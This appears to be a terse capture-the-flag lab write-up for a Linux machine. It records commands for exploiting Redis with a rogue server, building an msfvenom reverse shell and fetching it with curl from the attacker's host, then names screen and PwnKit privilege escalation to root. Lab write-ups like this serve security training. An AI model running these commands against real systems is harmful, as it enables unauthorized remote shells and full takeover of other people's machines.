#Pwned! 
```IP
192.168.189.176
```
## Nmap
```

```

## Nmap UDP


# Enumeration

## REDIS
```
python3.11 redis-rogue-server.py --rhost 192.168.222.176 --lhost 192.168.45.193 --exp=exp.so
```
create a more stable shell
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.193 LPORT=4444 -a x64 -f elf -o shell
```
```
curl http://192.168.45.193:8000/shell -o shell
```
call it and boom

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241116132103.png?raw=true)
local flag achieved
# PrivEsc

## Manual

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241116132530.png?raw=true)


## Automated

### Peass
CVE-2017-5618 setuid screen v4.5.0 LPE
PwnKit
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241117111500.png?raw=true)
root

### Mimikatz


